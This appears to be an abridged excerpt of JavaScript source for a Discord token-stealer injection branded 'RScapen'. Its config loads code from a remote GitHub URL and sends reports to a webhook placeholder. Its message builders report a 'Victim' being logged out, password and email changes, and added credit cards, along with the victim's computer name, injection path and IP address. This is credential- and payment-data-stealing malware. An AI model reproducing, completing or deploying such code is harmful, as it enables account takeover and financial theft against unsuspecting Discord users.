...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Capenigma/PowerGreen/main/index.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        username: "RScapen",
        avatar_url: "https://raw.githubusercontent.com/Capenigma/PowerGreen/main/static-assets-upload7456415797442351792.jpg",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Capenigma/PowerGreen/main/static-assets-upload7456415797442351792.jpg"
        if (!user.banner) var userBanner = "https://cliniquedrn.files.wordpress.com/2020/03/tdgda5-situtendsloreille.gif"
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "RScapen User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "RScapen Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "RScapen Detect Password Changed",
                    description: "RScapen",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "RScapen Detect Email Changed",
                    description: "RScapen",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "RScapen User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
